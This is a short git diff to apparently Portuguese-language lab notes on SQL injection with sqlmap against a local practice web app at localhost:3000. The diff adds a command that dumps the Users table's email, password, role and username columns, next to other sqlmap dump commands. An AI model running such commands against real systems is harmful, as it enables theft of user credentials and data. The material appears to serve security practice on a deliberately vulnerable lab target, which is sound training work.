@@ -25,7 +25,10 @@ sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level
 ```
 ```
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users --dump --threads=4
-``` 
+```
+```
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role,topSecret,username --dump --threads=4
+```
 ## Fontes:
 
 https://www.100security.com.br/sqlmap
